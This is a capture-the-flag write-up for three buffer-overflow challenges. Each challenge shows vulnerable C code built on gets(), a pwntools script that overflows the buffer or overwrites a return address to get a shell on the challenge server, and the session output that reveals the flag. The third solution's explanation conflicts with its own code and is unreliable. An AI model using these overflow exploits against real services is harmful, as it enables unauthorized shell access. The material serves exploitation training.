# Overflow 1 (125 points)

## Description

ez overflow.

nc cyberyoddha.baycyber.net 10001

[Overflow1](Overflow1);
[Overflow1.c](overflow1.c)

## Solution

Here is the file we were given.

```c
int main(void) {
  char str[] = "AAAA";
  char buf[16];

  gets(buf);
  
  if (!(str[0] == 'A' && str[1] == 'A' && str[2] == 'A' && str[3] == 'A')){
    system("/bin/sh");
  }
}
```

Buffer is defined as 16, so let's write small python script using pwntools.

```python
from pwn import *

payload = "A"*16

s = remote("cyberyoddha.baycyber.net", 10001)
s.sendline(payload)
s.interactive()
```
```shell
$ python overflow1.py
[+] Opening connection to cyberyoddha.baycyber.net on port 10001: Done
[*] Switching to interactive mode
$ ls
flag.txt
overflow1
$ cat flag.txt
CYCTF{st@ck_0v3rfl0ws_@r3_3z}
```

This task can be done easier: just enter 16 A using nc and get the flag

Flag: CYCTF{st@ck_0v3rfl0ws_@r3_3z}

# Overflow 2 (225 points)

## Description

ez overflow (or is it?)

nc cyberyoddha.baycyber.net 10002

[Overflow2](Overflow2);
[Overflow2.c](overflow2.c)

## Solution

Here is the file we were given.

```c
void run_shell(){
	system("/bin/sh");
}

void vuln(){
	char buf[16];
	gets(buf);
}

int main(void) {
	vuln();  
}
```

So we need to jump over to **run_shell** function using buffer overflow.
[Writeup for a similar task](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)

Let's find address of **run_shell** function using **objdump**

```shell
$ objdump -d overflow2
...
08049172 <run_shell>:                
 8049172:       55                      push   %ebp
 8049173:       89 e5                   mov    %esp,%ebp
 8049175:       53                      push   %ebx
 8049176:       83 ec 04                sub    $0x4,%esp
 8049179:       e8 63 00 00 00          call   80491e1 <__x86.get_pc_thunk.ax>
 804917e:       05 82 2e 00 00          add    $0x2e82,%eax
 8049183:       83 ec 0c                sub    $0xc,%esp
...
```

Address is **0x8049172** and buffer size is 28. Now let's open python and write another script:

```python
from pwn import *

payload = "A"*28
payload += p32(0x8049172)
s = remote("cyberyoddha.baycyber.net", 10002)
s.sendline(payload)
s.interactive()
```
```shell
$ python overflow2.py
[+] Opening connection to cyberyoddha.baycyber.net on port 10002: Done
[*] Switching to interactive mode
$ ls
flag.txt
overflow2
$ cat flag.txt
CYCTF{0v3rfl0w!ng_v@ri@bl3$_i$_3z}
```

Flag: CYCTF{0v3rfl0w!ng_v@ri@bl3$_i$_3z}

# Overflow 3 (250 points)

## Description

looks like buffer overflows aren’t so easy anymore.

nc cyberyoddha.baycyber.net 10003

[Overflow3](Overflow3);
[Overflow3.c](overflow3.c)

## Solution

Here is the file we were given.

```c
int main(void) {
	long vuln = 0;
        char buf[16];

	gets(buf);

	if (vuln == 0xd3adb33f){
		system("/bin/sh");
	}
}
```

Address is **0xd3adb33f** and buffer size is 16. Now let's open python and write another script:

```python
from pwn import *

payload = "A"*28
payload += p32(0xd3adb33f)
s = remote("cyberyoddha.baycyber.net", 10003)
s.sendline(payload)
s.interactive()
``` 
```shell
$ python overflow3.py
[+] Opening connection to cyberyoddha.baycyber.net on port 10003: Done
[*] Switching to interactive mode
$ ls
flag.txt
overflow3
$ cat flag.txt
CYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}
```

Flag: CYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}